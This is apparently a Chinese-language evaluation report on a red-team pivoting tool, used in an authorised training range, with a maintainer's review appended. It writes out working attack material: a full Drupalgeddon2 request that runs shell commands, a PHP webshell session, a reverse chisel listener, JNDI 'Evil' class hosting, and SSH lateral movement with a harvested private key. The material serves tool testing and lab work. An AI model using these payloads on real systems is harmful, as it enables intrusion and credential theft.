|---|---|---|
| 1 | Shiro 载荷生成：自写 `GenPayload.java`+stub（javac `-target 8`）、`shiro_cookie*.py`（pycryptodome AES-CBC/GCM）；从阿里云 Maven 下载 commons-beanutils/logging/collections | 面板无 Shiro 利用编排；GitHub 下载 ysoserial 持续被连接重置，无法获取现成工具 |
| 2 | JNDI 攻击设施：复用本机已在运行的 `RefServer`(unboundid, :1389) 与 `logsrv.py`(:80)，向其目录投放自编译 `Evil*.class`/`poc.xml` | ⑥⑦ 题面要求的 JNDI/ActiveMQ 利用需目标回连 80/443/1389；该设施为用户环境既有组件 |
| 3 | CVE-2023-46604 PoC 获取失败→改经 WebSearch 定位 vulhub 权威 `poc.py`，CDN(jsdelivr) 抓取 | 本机直连 GitHub 反复被重置（exit 56） |
| 4 | 隧道攻击端：本机运行 `chisel server -p 1331 --reverse`、`python -m http.server 8009/443` | 面板「攻击机监听」无本地命令执行终端（「发送到该节点终端」无落地），外部代为执行攻击端命令 |
| 5 | 隧道连通性验证：`curl --socks5-hostname 127.0.0.1:10006 http://172.31.0.20:8080/app`（200） | 面板链路登记失效后对手工隧道的替代性连通验证 |
| 6 | 本机进程/端口诊断（netstat/tasklist）与截图文件归档复制 | 环境诊断与证据整理，非靶场操作 |

### 合规声明

- **面板本身**：全部操作（项目/设置/资产/会话/终端/文件/代理/数据库/凭据/Flag/时间线/导出/插件市场）均通过内置浏览器 GUI 完成，未用 curl/REST/SQLite 直读等方式绕过界面完成或验证任何面板步骤。
- **目标靶机**：所有目标侧命令执行均经「面板虚拟终端/文件管理」或「内置浏览器页面内 fetch/导航」完成（TP RCE、SSTI、Drupalgeddon2、PUT、Log4Shell、Shiro cookie 均为浏览器内发起）；外部动作仅限上表所列的「利用载荷生成/攻击端服务托管/PoC 获取」，属任务书第 7 条允许的例外，且每次已说明原因。
- 所有测试均限于本人授权的本地靶场环境（10.8.0.6 / 172.x 内网段），未触碰任何未授权目标。

---

## 附：本次产物

- 截图证据：`docs/screenshots/01~07-*.png`（7 张关键过程图）
- 复盘导出样例：`docs/export/writeup-②孤岛-评测.md`（②项目 Markdown 导出原文）
- 本报告：`docs/USAGE-REPORT-20260911.md`

---

## 附：复盘导出（②孤岛·封锁边界-评测 · 面板「复盘导出」Markdown 原文）

# ②孤岛·封锁边界-评测 · Writeup

> 生成时间：2026/9/11 03:45:07  
> 工具：PivotHub（链透中枢）· 本报告为初稿，需人工润色

## 0. 概览

| 指标 | 数值 |
|---|---|
| 已控主机 | 1 / 1 |
| 层级深度 | L1 → L1 |
| 代理链路 | 0 / 0 存活 |
| 凭据 | 1 条 |
| Flag | 3 / 6 |

## 1. 网络拓扑

```
攻击端 127.0.0.1
```

![拓扑快照](screenshots/topology.png)

## 2. 跳板链参数

| 工具 | 方向 | 入口 | 出口 | 本地 Socks | 目标网段 |
|---|---|---|---|---|---|

## 3. 操作时间线

### 16:58 · 资产 — 新建项目：②孤岛·封锁边界-评测

- 已创建攻击端本机节点 10.8.0.14（取当前攻击机网络配置）

### 17:03 · 资产 — 添加 Shell 自动登记主机 10.8.0.6

- 主机：`10.8.0.6`
- 添加 Shell 时未选择归属主机：由 URL 地址自动创建，请人工补充信息

### 17:03 · 资产 — 自动回传基础信息并入库

- 主机：`10.8.0.6`
- whoami=www-data / uname=Linux web-edge 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux

### 17:03 · Shell — 登记并连接 Shell：http://10.8.0.6:8083/xp.php

- 主机：`10.8.0.6`
- 类型 PHP 一句话马 · 编码器 none · 延迟 139ms · whoami=www-data / uname=Linux web-edge 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux

### 17:04 · 代理 — 出网探测完成：仅 HTTP(S) 出网

- 主机：`10.8.0.6`
- 推荐 Neo-reGeorg（HTTP 隧道，复用已登记 Webshell） · 备选 chisel over HTTP / 冰蝎·哥斯拉内置 HTTP 隧道 · 证据 ICMP=ok; DNS=fail; HTTP=ok; TCP=fail

### 17:14 · Flag — 拿到 Flag：L1 入口

- 主机：`10.8.0.6`
- flag{REDACTED}

### 17:14 · Flag — 拿到 Flag：L2 内网

- 主机：`10.8.0.6`
- flag{REDACTED}

### 17:14 · Flag — 拿到 Flag：L2 内网

- 主机：`10.8.0.6`
- flag{REDACTED}

### 17:15 · 凭据 — 登记凭据 admin

- 主机：`10.8.0.6`
- 密码 · 来源 /var/www/html/application/extra/ops.php 明文

## 4. 凭据清单（明文）

| 账号 | 类型 | 凭据 | 来源主机 | 适用服务 |
|---|---|---|---|---|
| `admin` | 密码 | `REDACTED` | 10.8.0.6 | oa,web |

## 5. Flag 收集

| 主机 | 阶段 | Flag | 状态 |
|---|---|---|---|
| 10.8.0.6 | L1 入口 | `flag{REDACTED}` | 待提交 |
| 10.8.0.6 | L2 内网 | `flag{REDACTED}` | 待提交 |
| 10.8.0.6 | L2 内网 | `flag{REDACTED}` | 待提交 |

## 6. 总结与反思

> 待补充：本层关键突破点、踩坑与改进思路。

---

# 8. 部署维护方复核补充（2026-09-11，靶机侧实测，作为本报告的补充章节）

> 复核人：靶场部署维护方。方法：在靶机宿主与各容器内逐条重放红队报告中的疑点，全部带原始命令与输出。目的：区分「靶机流程问题导致的对工具的误判」与「工具自身缺陷」，并给出精确的环境行为说明。

## 8.1 总判定表（原文编号 → 靶机侧结论）

| 原文条目 | 靶机侧判定 | 关键证据 |
|---|---|---|
| **⑤ 终端 0/3「disable_functions 全禁 / 入口受阻」** | ❌ **误判（靶机无责，入口完全可用）** | 标准载荷 `element_parents=account/mail/%23value` + `#post_render[]=exec` + `#markup=id;cat /flag1.txt` → 0.1s 直出 flag1；`system('echo SYSOK')`→SYSOK；`exec('sleep 8;echo DELAY-8')`→响应 8.1s+DELAY-8。三大命令函数全部可用 |
| ⑤「`*.php.bak` 403 疑似后门线索」 | ❌ 误读 | 403 来自 **Drupal 自带 .htaccess 默认防护规则**（站点根 .htaccess 内置 `\.php(...\.bak...)` deny），与后门无关；⑤ 环境从未设计"后门文件"环节 |
| ③「DMZ 出站被防火墙拦截」 | ⚠️ 方向对、归因错 | DMZ **确实无出站**，但原因是其双网卡均为 `internal` 网络（无默认路由），非 iptables。实测：DMZ→宿主 9999 超时；同刻边界机→宿主 9999=200、→红队 10.8.0.14:1389 OPEN |
| ③ flag4「SSH 授权用户/密钥未命中」 | ❌ 线索漏读（靶机无责） | 正确用户为 **`bkp`**（非 root/backup/dev/ops/admin）。线索在 DMZ `/root/.bash_history` 首行 `ssh -i /root/.ssh/id_rsa bkp@10.66.0.20` 与 `/etc/hosts`。实测 `ssh -i /root/.ssh/id_rsa bkp@10.66.0.20` → uid=1000(bkp) 成功登入，flag3 可读 |
| ②「探测 HTTP 可达 与留档矛盾」 | ❌ 工具假阳性（留档准确） | 留档原文仅放行 ESTABLISHED/内网段/ICMP/UDP53（**无 80/443**）；红队自身 443 反弹超时与留档一致。是探测报错，不是环境矛盾 |
| ③「探测仅 DNS 出网」 | ❌ 完全误判 | ③ 边界出站全放行（→宿主任意端口 200、→红队 1389 OPEN），且同会话反向 shell 217ms 回连成功——结论与工具自身事实相矛盾 |
| P0-2 Flag 500 | 与靶机无关 | hostId 外键校验问题 |
| P1-1/1-3/1-4/1-5 | 与靶机无关 | 环境侧手工 chisel 隧道可通（红队自验证 socks 200）、同会话手动命令正常 |
| P1-2 fscan 0 台 | 与靶机无关 | 同一靶机手动执行 fscan 输出完全正常 |
| P1-6 Shiro 指纹 | 与靶机无关（可发现性充分） | `/app` 由「目录/上下文发现」已挖出；`rememberMe=deleteMe` curl 可测 |
| P2-9 反弹源 IP 全为 10.8.0.6 | 拓扑固有 | 容器出站经宿主 tun0 SNAT；请按监听端口 + 回连 `hostname` 区分主机 |
| ⑦「busybox 必须写全 tag」 | 环境行为正确 | dind 离线环境仅导入 `busybox:1.36`；无 tag 会尝试拉 registry（失败属预期） |

## 8.2 ⑤ 终端：可立即补 3/3 的正确姿势（靶机实测）

```http
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form&_drupal_ajax=1&mail[#type]=markup&mail[#post_render][]=exec&mail[#markup]=id;cat /flag1.txt
```
要点：**`element_parents` 必须带 `%23value`**。红队使用的 `account/mail`（不带 `#value`）变体下，post_render 回调收到的是渲染结果标量，exec 拿到非命令字符串故无输出——这正是「print_r 有回显、exec 无输出」现象的成因。
后续链：`http://10.8.0.6:8086/sites/default/files/ops-notes.txt`（HTTP 200 实测，含 Jenkins 172.35.0.20:8080 与 setcap 提示）→ Jenkins 匿名 Script Console（crumb 与会话绑定）flag2 → `python3` cap_setuid=ep → flag3。

## 8.3 ③ 深潜：各层出站的精确行为（供工具探测对照）

| 层 | 出站行为 | 说明 |
|---|---|---|
| 边界 172.30.0.10/172.31.0.10 | 完全放行 | 任意端口回连红队（实测 1389 OPEN / 9999 200） |
| DMZ 172.31.0.20 | **无任何出站**（双 internal 网络，无默认路由） | 非防火墙；DMZ 操作结果请写 webroot 后经边界读回（红队第三轮方法正确）；DMZ→核心 10.66.0.0/24 正常 |
| 核心 10.66.0.20 | 无出站 | 仅接受来自 DMZ 的 SSH（bkp@ 密钥） |

## 8.4 环境侧行动与建议

- 已更新《红队工具测试靶场指南》（`ctf-intranet-lab/REDTEAM-GUIDE.md`）至 v1.1，新增「附录 C：常见误判澄清」共 6 条（出站精确表、⑤ 正确载荷、③ bkp、零外联判定法、NAT、busybox tag）。
- 可选环境增强（待确认后实施）：⑤ 线索文件增加页面/robots 可发现入口；⑦ dind 补充 `busybox:latest` 别名 tag；② 留档头部增加运行时一致性自证备注。
- **补分路径**：按 8.2/8.3 执行，⑤ 可补回 3 flag、③ 可补 flag4；复核确认当前 22 个 flag 均处于环境可达状态。

> 以上为维护方复核结论，原文其余条目（P0-1/P0-2/P1-x/P2-x 的工具缺陷与优化建议）经靶机侧证据交叉确认成立，归属工具侧修复范围，环境不做改动。
